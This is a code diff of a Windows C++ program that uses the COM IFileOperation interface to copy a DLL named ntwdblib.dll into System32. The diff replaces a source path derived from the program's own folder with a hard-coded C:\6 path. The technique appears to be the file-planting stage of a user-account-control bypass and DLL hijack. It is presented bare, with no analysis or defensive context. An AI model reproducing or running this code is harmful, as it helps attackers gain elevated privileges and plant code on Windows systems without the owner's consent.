@@ -1,21 +1,12 @@
 #include <Shobjidl.h>
-#include <string>
 
-int WINAPI WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,int nCmdShow)
+int _tmain(int argc, _TCHAR* argv[])
 {
 	HMODULE hModule = NULL;
-	LPCWSTR dllName = L"ntwdblib.dll";
 	IFileOperation *fileOperation = NULL;
-	wchar_t dllPath[1024];
-	GetModuleFileName(hModule, dllPath, 1024);
-	std::wstring path(dllPath);
-	const size_t last = path.rfind('\\');
-	if (std::wstring::npos != last)
-	{
-		path = path.substr(0, last + 1);
-	}
-	path += dllName;
-	LPCWSTR destPath = L"C:\\windows\\System32";
+	LPCWSTR dllName = L"ntwdblib.dll";
+	LPCWSTR SourceFullPath = L"C:\\6\\ntwdblib.dll";
+	LPCWSTR DestPath = L"C:\\windows\\System32";
 	HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
 	if (SUCCEEDED(hr)) {
 		hr = CoCreateInstance(CLSID_FileOperation, NULL, CLSCTX_ALL, IID_PPV_ARGS(&fileOperation));
@@ -29,10 +20,10 @@ int WINAPI WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,i
 				FOF_NOERRORUI);
 			if (SUCCEEDED(hr)) {
 				IShellItem *from = NULL, *to = NULL;
-				hr = SHCreateItemFromParsingName(path.data(), NULL, IID_PPV_ARGS(&from));
+				hr = SHCreateItemFromParsingName(SourceFullPath, NULL, IID_PPV_ARGS(&from));
 				if (SUCCEEDED(hr)) {
-					if (destPath)
-						hr = SHCreateItemFromParsingName(destPath, NULL, IID_PPV_ARGS(&to));
+					if (DestPath)
+						hr = SHCreateItemFromParsingName(DestPath, NULL, IID_PPV_ARGS(&to));
 					if (SUCCEEDED(hr)) {
 						hr = fileOperation->CopyItem(from, to, dllName, NULL);
 						if (NULL != to)
@@ -48,6 +39,5 @@ int WINAPI WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,i
 		}
 		CoUninitialize();
 	}
-//	MessageBoxA(0, "Hello World", "Hello World", 0);
 	return 0;
 }
